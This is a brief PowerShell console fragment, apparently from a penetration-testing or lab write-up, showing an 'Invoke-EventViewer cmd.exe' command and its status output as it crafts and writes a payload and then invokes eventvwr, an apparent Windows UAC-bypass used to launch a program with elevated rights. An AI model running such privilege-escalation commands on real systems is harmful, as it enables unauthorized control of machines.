PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
[+] Running
[1] Crafting Payload
[2] Writing Payload
[+] EventViewer Folder exists
[3] Finally, invoking eventvwr
```
